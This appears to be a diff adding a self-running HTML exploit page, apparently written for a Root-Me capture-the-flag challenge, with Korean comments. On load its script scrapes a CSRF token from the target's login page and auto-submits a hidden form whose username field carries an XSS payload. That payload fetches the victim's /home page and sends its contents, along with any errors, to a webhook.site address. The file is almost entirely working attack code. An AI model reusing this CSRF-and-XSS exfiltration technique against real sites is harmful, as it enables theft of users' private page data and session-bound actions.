@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack Page</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    <script>
+        // 공격 대상과 Webhook URL 설정
+        const challengeUrl = 'http://challenge01.root-me.org:58039';
+        const webhookUrl = 'https://webhook.site/29229478-3d1a-4cb7-90c7-4ce0526bf4c1';
+
+        async function launchAttack() {
+            try {
+                // 1. iframe을 이용해 로그인 페이지에서 CSRF 토큰을 훔칩니다.
+                const response = await fetch(challengeUrl + '/login');
+                const pageText = await response.text();
+                const csrfToken = pageText.match(/name="_csrf" value="([^"]+)"/)[1];
+                console.log('Stole CSRF Token:', csrfToken);
+
+                // 2. 훔친 토큰과 XSS 페이로드를 담아 강제로 로그인 실패(POST)를 유발하는 폼을 만듭니다.
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = challengeUrl + '/login';
+
+                const usernameInput = document.createElement('input');
+                usernameInput.type = 'hidden';
+                usernameInput.name = 'username';
+                // 여기가 바로 /home 페이지 내용을 훔쳐오는 최종 XSS 페이로드입니다.
+                usernameInput.value = `<img src=x onerror="fetch('/home').then(r=>r.text()).then(d=>fetch('${webhookUrl}/?data='+encodeURIComponent(d)))">`;
+                
+                const passwordInput = document.createElement('input');
+                passwordInput.type = 'hidden';
+                passwordInput.name = 'password';
+                passwordInput.value = 'trigger_xss'; // 로그인 실패를 위한 아무 비밀번호
+
+                const csrfInput = document.createElement('input');
+                csrfInput.type = 'hidden';
+                csrfInput.name = '_csrf';
+                csrfInput.value = csrfToken;
+
+                form.appendChild(usernameInput);
+                form.appendChild(passwordInput);
+                form.appendChild(csrfInput);
+
+                document.body.appendChild(form);
+                
+                // 3. 폼을 제출하여 공격을 실행합니다.
+                form.submit();
+
+            } catch (e) {
+                console.error('Attack failed:', e);
+                // 오류 내용을 Webhook으로 보내 디버깅을 돕습니다.
+                fetch(`${webhookUrl}/?error=` + encodeURIComponent(e.message));
+            }
+        }
+
+        launchAttack();
+    </script>
+</body>
+</html>
